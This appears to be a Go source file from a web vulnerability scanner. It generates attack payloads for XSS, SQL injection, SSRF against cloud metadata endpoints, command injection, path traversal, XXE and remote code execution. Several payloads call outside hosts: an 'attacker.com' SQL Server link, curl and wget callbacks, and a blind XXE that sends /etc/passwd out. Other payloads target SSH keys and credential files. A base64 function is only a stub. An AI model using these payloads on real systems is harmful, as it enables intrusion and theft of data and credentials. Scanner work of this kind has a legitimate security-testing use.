// internal/core/payload_generator.go
package core

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// PayloadType represents different types of payloads
type PayloadType string

const (
	PayloadXSS         PayloadType = "xss"
	PayloadSQLI        PayloadType = "sqli"
	PayloadXXE         PayloadType = "xxe"
	PayloadSSRF        PayloadType = "ssrf"
	PayloadLFI         PayloadType = "lfi"
	PayloadRCE         PayloadType = "rce"
	PayloadLDAP        PayloadType = "ldap"
	PayloadCommandInj  PayloadType = "command_injection"
	PayloadPathTraversal PayloadType = "path_traversal"
)

// EncodingType represents different payload encoding methods
type EncodingType string

const (
	EncodingNone       EncodingType = "none"
	EncodingURL        EncodingType = "url"
	EncodingHTML       EncodingType = "html"
	EncodingBase64     EncodingType = "base64"
	EncodingHex        EncodingType = "hex"
	EncodingUnicode    EncodingType = "unicode"
	EncodingDoubleURL  EncodingType = "double_url"
)

// PayloadContext represents the context where payload will be used
type PayloadContext string

const (
	ContextHTML       PayloadContext = "html"
	ContextAttribute  PayloadContext = "attribute"
	ContextJavaScript PayloadContext = "javascript"
	ContextCSS        PayloadContext = "css"
	ContextURL        PayloadContext = "url"
	ContextJSON       PayloadContext = "json"
	ContextXML        PayloadContext = "xml"
)

// PayloadConfig defines configuration for payload generation
type PayloadConfig struct {
	Type         PayloadType
	Context      PayloadContext
	Encoding     EncodingType
	Target       string
	CustomMarker string
	Obfuscate    bool
	MaxLength    int
	FilterBypass bool
}

// PayloadResult contains generated payload and metadata
type PayloadResult struct {
	Payload     string
	Description string
	Type        PayloadType
	Context     PayloadContext
	Encoding    EncodingType
	Risk        string
	DetectionTips []string
}

// PayloadGenerator provides advanced payload generation capabilities
type PayloadGenerator struct {
	config PayloadConfig
}

// NewPayloadGenerator creates a new payload generator
func NewPayloadGenerator(config PayloadConfig) *PayloadGenerator {
	if config.CustomMarker == "" {
		config.CustomMarker = generateRandomMarker()
	}
	return &PayloadGenerator{config: config}
}

// GeneratePayloads creates multiple payloads based on configuration
func (pg *PayloadGenerator) GeneratePayloads() []PayloadResult {
	var payloads []PayloadResult

	switch pg.config.Type {
	case PayloadXSS:
		payloads = pg.generateXSSPayloads()
	case PayloadSQLI:
		payloads = pg.generateSQLIPayloads()
	case PayloadXXE:
		payloads = pg.generateXXEPayloads()
	case PayloadSSRF:
		payloads = pg.generateSSRFPayloads()
	case PayloadLFI:
		payloads = pg.generateLFIPayloads()
	case PayloadRCE:
		payloads = pg.generateRCEPayloads()
	case PayloadCommandInj:
		payloads = pg.generateCommandInjectionPayloads()
	case PayloadPathTraversal:
		payloads = pg.generatePathTraversalPayloads()
	default:
		payloads = pg.generateGenericPayloads()
	}

	// Apply encoding to all payloads
	for i := range payloads {
		payloads[i].Payload = pg.encodePayload(payloads[i].Payload)
		payloads[i].Encoding = pg.config.Encoding
	}

	return payloads
}

// XSS Payload Generation
func (pg *PayloadGenerator) generateXSSPayloads() []PayloadResult {
	marker := pg.config.CustomMarker
	
	basePayloads := map[string]string{
		"script_basic":     fmt.Sprintf("<script>alert('%s')</script>", marker),
		"script_advanced":  fmt.Sprintf("<script>window['alert']('%s')</script>", marker),
		"img_onerror":      fmt.Sprintf("<img src=x onerror=alert('%s')>", marker),
		"svg_onload":       fmt.Sprintf("<svg onload=alert('%s')>", marker),
		"iframe_src":       fmt.Sprintf("<iframe src=javascript:alert('%s')>", marker),
		"input_autofocus":  fmt.Sprintf("<input autofocus onfocus=alert('%s')>", marker),
		"details_ontoggle": fmt.Sprintf("<details ontoggle=alert('%s') open>", marker),
		"body_onload":      fmt.Sprintf("<body onload=alert('%s')>", marker),
		"template_content": fmt.Sprintf("<template><script>alert('%s')</script></template>", marker),
	}

	// Context-specific payloads
	if pg.config.Context == ContextAttribute {
		basePayloads["attr_break"] = fmt.Sprintf("' onmouseover=alert('%s') '", marker)
		basePayloads["attr_quote"] = fmt.Sprintf("\"><script>alert('%s')</script><\"", marker)
	}

	if pg.config.Context == ContextJavaScript {
		basePayloads["js_string_break"] = fmt.Sprintf("';alert('%s');//", marker)
		basePayloads["js_template"] = fmt.Sprintf("${alert('%s')}", marker)
	}

	// Filter bypass payloads
	if pg.config.FilterBypass {
		basePayloads["uppercase"] = fmt.Sprintf("<SCRIPT>alert('%s')</SCRIPT>", marker)
		basePayloads["mixed_case"] = fmt.Sprintf("<ScRiPt>alert('%s')</ScRiPt>", marker)
		basePayloads["no_quotes"] = fmt.Sprintf("<script>alert(String.fromCharCode(88,83,83))</script>")
		basePayloads["unicode"] = fmt.Sprintf("<script>\\u0061lert('%s')</script>", marker)
		basePayloads["hex_encoded"] = fmt.Sprintf("<script>alert('\\x%s')</script>", hexEncode(marker))
	}

	var results []PayloadResult
	for desc, payload := range basePayloads {
		results = append(results, PayloadResult{
			Payload:     payload,
			Description: fmt.Sprintf("XSS - %s", desc),
			Type:        PayloadXSS,
			Context:     pg.config.Context,
			Risk:        "HIGH",
			DetectionTips: []string{
				"Look for alert dialog or console output",
				"Check if marker appears in DOM",
				"Monitor JavaScript execution",
			},
		})
	}

	return results
}

// SQL Injection Payload Generation
func (pg *PayloadGenerator) generateSQLIPayloads() []PayloadResult {
	marker := pg.config.CustomMarker
	
	basePayloads := map[string]string{
		"union_select":      fmt.Sprintf("' UNION SELECT 1,'%s',3--", marker),
		"error_based":       fmt.Sprintf("' AND (SELECT * FROM (SELECT COUNT(*),CONCAT('%s',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", marker),
		"time_based":        fmt.Sprintf("'; WAITFOR DELAY '00:00:05'--"),
		"boolean_based":     fmt.Sprintf("' AND 1=1--"),
		"stacked_queries":   fmt.Sprintf("'; INSERT INTO test VALUES('%s')--", marker),
		"mysql_version":     "' AND @@version--",
		"mssql_version":     "' AND @@version--",
		"postgres_version":  "' AND version()--",
		"oracle_version":    "' AND (SELECT banner FROM v$version WHERE rownum=1)--",
	}

	// Database-specific payloads
	if strings.Contains(strings.ToLower(pg.config.Target), "mysql") {
		basePayloads["mysql_info"] = "' AND (SELECT LOAD_FILE('/etc/passwd'))--"
		basePayloads["mysql_outfile"] = fmt.Sprintf("' UNION SELECT '%s' INTO OUTFILE '/tmp/test.txt'--", marker)
	}

	if strings.Contains(strings.ToLower(pg.config.Target), "mssql") {
		basePayloads["mssql_xp"] = "'; EXEC xp_cmdshell('whoami')--"
		basePayloads["mssql_linked"] = "'; SELECT * FROM OPENROWSET('SQLOLEDB','server=attacker.com;uid=sa;pwd=pass','SELECT 1')--"
	}

	// NoSQL injection payloads
	basePayloads["nosql_always_true"] = "' || '1'=='1"
	basePayloads["nosql_regex"] = "' || this.password.match(/.*/)//+%00"
	basePayloads["mongodb_where"] = "'; return this.username == 'admin' && this.password == 'admin'"

	var results []PayloadResult
	for desc, payload := range basePayloads {
		results = append(results, PayloadResult{
			Payload:     payload,
			Description: fmt.Sprintf("SQLi - %s", desc),
			Type:        PayloadSQLI,
			Context:     pg.config.Context,
			Risk:        "CRITICAL",
			DetectionTips: []string{
				"Monitor database errors",
				"Check for data extraction",
				"Look for time delays",
				"Verify boolean conditions",
			},
		})
	}

	return results
}

// SSRF Payload Generation
func (pg *PayloadGenerator) generateSSRFPayloads() []PayloadResult {
	marker := pg.config.CustomMarker
	
	basePayloads := map[string]string{
		"localhost":         "http://127.0.0.1:80",
		"internal_network":  "http://192.168.1.1",
		"aws_metadata":      "http://169.254.169.254/latest/meta-data/",
		"gcp_metadata":      "http://metadata.google.internal/computeMetadata/v1/",
		"azure_metadata":    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		"file_protocol":     "file:///etc/passwd",
		"gopher_protocol":   "gopher://127.0.0.1:25/_HELO%20localhost",
		"dict_protocol":     "dict://127.0.0.1:11211/",
		"ftp_protocol":      "ftp://127.0.0.1/",
		"bypass_decimal":    "http://2130706433/", // 127.0.0.1 in decimal
		"bypass_octal":      "http://0177.0.0.1/", // 127.0.0.1 in octal
		"bypass_hex":        "http://0x7f.0x0.0x0.0x1/", // 127.0.0.1 in hex
		"bypass_short":      "http://127.1/",
	}

	// Add custom callback server if provided
	if pg.config.Target != "" {
		basePayloads["callback"] = fmt.Sprintf("http://%s.%s/", marker, pg.config.Target)
	}

	var results []PayloadResult
	for desc, payload := range basePayloads {
		results = append(results, PayloadResult{
			Payload:     payload,
			Description: fmt.Sprintf("SSRF - %s", desc),
			Type:        PayloadSSRF,
			Context:     pg.config.Context,
			Risk:        "HIGH",
			DetectionTips: []string{
				"Monitor outbound network connections",
				"Check for internal service responses",
				"Look for cloud metadata access",
				"Verify callback server hits",
			},
		})
	}

	return results
}

// Command Injection Payload Generation
func (pg *PayloadGenerator) generateCommandInjectionPayloads() []PayloadResult {
	marker := pg.config.CustomMarker
	
	basePayloads := map[string]string{
		"semicolon":       fmt.Sprintf("; echo '%s'", marker),
		"ampersand":       fmt.Sprintf("& echo '%s'", marker),
		"pipe":            fmt.Sprintf("| echo '%s'", marker),
		"backticks":       fmt.Sprintf("`echo '%s'`", marker),
		"dollar_paren":    fmt.Sprintf("$(echo '%s')", marker),
		"newline":         fmt.Sprintf("\necho '%s'", marker),
		"windows_amp":     fmt.Sprintf("& echo %s", marker),
		"windows_pipe":    fmt.Sprintf("| echo %s", marker),
		"powershell":      fmt.Sprintf("; Write-Host '%s'", marker),
		"sleep_unix":      "; sleep 5",
		"sleep_windows":   "& timeout /t 5",
		"curl_callback":   fmt.Sprintf("; curl http://%s.com/%s", marker, marker),
		"wget_callback":   fmt.Sprintf("; wget http://%s.com/%s", marker, marker),
	}

	var results []PayloadResult
	for desc, payload := range basePayloads {
		results = append(results, PayloadResult{
			Payload:     payload,
			Description: fmt.Sprintf("Command Injection - %s", desc),
			Type:        PayloadCommandInj,
			Context:     pg.config.Context,
			Risk:        "CRITICAL",
			DetectionTips: []string{
				"Monitor system command execution",
				"Check for marker in output",
				"Look for time delays",
				"Verify callback server hits",
			},
		})
	}

	return results
}

// Path Traversal Payload Generation
func (pg *PayloadGenerator) generatePathTraversalPayloads() []PayloadResult {
	basePayloads := map[string]string{
		"basic_unix":        "../../../etc/passwd",
		"basic_windows":     "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"encoded_unix":      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"double_encoded":    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
		"null_byte":         "../../../etc/passwd%00",
		"deep_traversal":    "../../../../../../../../../../../../etc/passwd",
		"windows_drive":     "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"mixed_slashes":     "..\\../\\..\\../etc/passwd",
		"unicode_bypass":    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"filter_bypass":     "....//....//....//etc//passwd",
	}

	var results []PayloadResult
	for desc, payload := range basePayloads {
		results = append(results, PayloadResult{
			Payload:     payload,
			Description: fmt.Sprintf("Path Traversal - %s", desc),
			Type:        PayloadPathTraversal,
			Context:     pg.config.Context,
			Risk:        "HIGH",
			DetectionTips: []string{
				"Look for file contents in response",
				"Check for directory listing",
				"Monitor file access logs",
				"Verify sensitive file disclosure",
			},
		})
	}

	return results
}

// XXE Payload Generation
func (pg *PayloadGenerator) generateXXEPayloads() []PayloadResult {
	marker := pg.config.CustomMarker
	
	basePayloads := map[string]string{
		"basic_file": fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`),
		
		"windows_file": fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
<root>&xxe;</root>`),
		
		"http_request": fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://%s.com/">]>
<root>&xxe;</root>`, marker),
		
		"parameter_entity": fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY %% xxe SYSTEM "file:///etc/passwd">%%xxe;]>
<root>test</root>`),
		
		"blind_xxe": fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY %% file SYSTEM "file:///etc/passwd">
<!ENTITY %% error "<!ENTITY &#x25; exfil SYSTEM 'http://%s.com/%%file;'>">
%%error;%%exfil;]>
<root>test</root>`, marker),
	}

	var results []PayloadResult
	for desc, payload := range basePayloads {
		results = append(results, PayloadResult{
			Payload:     payload,
			Description: fmt.Sprintf("XXE - %s", desc),
			Type:        PayloadXXE,
			Context:     pg.config.Context,
			Risk:        "HIGH",
			DetectionTips: []string{
				"Look for file contents in response",
				"Monitor outbound HTTP requests",
				"Check for XML parsing errors",
				"Verify entity resolution",
			},
		})
	}

	return results
}

// LFI and RCE payload generation
func (pg *PayloadGenerator) generateLFIPayloads() []PayloadResult {
	marker := pg.config.CustomMarker
	
	basePayloads := map[string]string{
		"proc_self":     "/proc/self/environ",
		"proc_version":  "/proc/version",
		"ssh_keys":      "/home/user/.ssh/id_rsa",
		"apache_log":    "/var/log/apache2/access.log",
		"nginx_log":     "/var/log/nginx/access.log",
		"auth_log":      "/var/log/auth.log",
		"mail_log":      "/var/log/mail.log",
		"php_session":   fmt.Sprintf("/tmp/sess_%s", marker),
		"expect_filter": "expect://whoami",
		"input_filter":  fmt.Sprintf("php://input + POST data: <?php echo '%s'; ?>", marker),
	}

	var results []PayloadResult
	for desc, payload := range basePayloads {
		results = append(results, PayloadResult{
			Payload:     payload,
			Description: fmt.Sprintf("LFI - %s", desc),
			Type:        PayloadLFI,
			Context:     pg.config.Context,
			Risk:        "HIGH",
			DetectionTips: []string{
				"Look for file contents in response",
				"Check for log file inclusion",
				"Monitor for RCE via log poisoning",
				"Verify filter wrapper usage",
			},
		})
	}

	return results
}

func (pg *PayloadGenerator) generateRCEPayloads() []PayloadResult {
	marker := pg.config.CustomMarker
	
	basePayloads := map[string]string{
		"php_eval":        fmt.Sprintf("<?php echo '%s'; ?>", marker),
		"php_system":      fmt.Sprintf("<?php system('echo %s'); ?>", marker),
		"php_exec":        fmt.Sprintf("<?php exec('echo %s'); ?>", marker),
		"jsp_runtime":     fmt.Sprintf("<%= Runtime.getRuntime().exec(\"echo %s\") %%>", marker),
		"asp_shell":       fmt.Sprintf("<% CreateObject(\"WScript.Shell\").Exec(\"echo %s\") %%>", marker),
		"python_eval":     fmt.Sprintf("__import__('os').system('echo %s')", marker),
		"node_child":      fmt.Sprintf("require('child_process').exec('echo %s')", marker),
	}

	var results []PayloadResult
	for desc, payload := range basePayloads {
		results = append(results, PayloadResult{
			Payload:     payload,
			Description: fmt.Sprintf("RCE - %s", desc),
			Type:        PayloadRCE,
			Context:     pg.config.Context,
			Risk:        "CRITICAL",
			DetectionTips: []string{
				"Look for command output in response",
				"Monitor system process execution",
				"Check for marker in system logs",
				"Verify code execution context",
			},
		})
	}

	return results
}

func (pg *PayloadGenerator) generateGenericPayloads() []PayloadResult {
	marker := pg.config.CustomMarker
	
	return []PayloadResult{
		{
			Payload:     fmt.Sprintf("test_%s", marker),
			Description: "Generic test payload",
			Type:        "generic",
			Context:     pg.config.Context,
			Risk:        "INFO",
			DetectionTips: []string{"Look for marker reflection"},
		},
	}
}

// Encoding functions
func (pg *PayloadGenerator) encodePayload(payload string) string {
	switch pg.config.Encoding {
	case EncodingURL:
		return url.QueryEscape(payload)
	case EncodingHTML:
		return htmlEncode(payload)
	case EncodingBase64:
		return base64Encode(payload)
	case EncodingHex:
		return hexEncode(payload)
	case EncodingUnicode:
		return unicodeEncode(payload)
	case EncodingDoubleURL:
		return url.QueryEscape(url.QueryEscape(payload))
	default:
		return payload
	}
}

// Utility functions
func generateRandomMarker() string {
	timestamp := time.Now().Unix()
	randomBytes := make([]byte, 4)
	rand.Read(randomBytes)
	return fmt.Sprintf("apex_%d_%s", timestamp, hex.EncodeToString(randomBytes))
}

func htmlEncode(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	s = strings.ReplaceAll(s, "\"", "&quot;")
	s = strings.ReplaceAll(s, "'", "&#39;")
	return s
}

func base64Encode(s string) string {
	// Simple base64 encoding simulation
	return fmt.Sprintf("base64:%s", s) // In real implementation, use proper base64
}

func hexEncode(s string) string {
	return hex.EncodeToString([]byte(s))
}

func unicodeEncode(s string) string {
	var result strings.Builder
	for _, r := range s {
		if r > 127 {
			result.WriteString(fmt.Sprintf("\\u%04x", r))
		} else {
			result.WriteRune(r)
		}
	}
	return result.String()
}

// GetPayloadsByType returns predefined payloads for a specific type
func GetPayloadsByType(payloadType PayloadType) []string {
	generator := NewPayloadGenerator(PayloadConfig{
		Type:     payloadType,
		Context:  ContextHTML,
		Encoding: EncodingNone,
	})
	
	results := generator.GeneratePayloads()
	var payloads []string
	for _, result := range results {
		payloads = append(payloads, result.Payload)
	}
	
	return payloads
}

// ValidatePayload checks if a payload is potentially dangerous
func ValidatePayload(payload string) (bool, []string) {
	var warnings []string
	dangerous := false
	
	// Check for potentially dangerous patterns
	dangerousPatterns := []string{
		`<script[^>]*>.*</script>`,
		`javascript:`,
		`on\w+\s*=`,
		`system\(.*\)`,
		`exec\(.*\)`,
		`eval\(.*\)`,
		`file:///`,
		`\.\./`,
		`UNION\s+SELECT`,
		`DROP\s+TABLE`,
	}
	
	for _, pattern := range dangerousPatterns {
		if matched, _ := regexp.MatchString(`(?i)`+pattern, payload); matched {
			dangerous = true
			warnings = append(warnings, fmt.Sprintf("Potentially dangerous pattern detected: %s", pattern))
		}
	}
	
	return dangerous, warnings
}
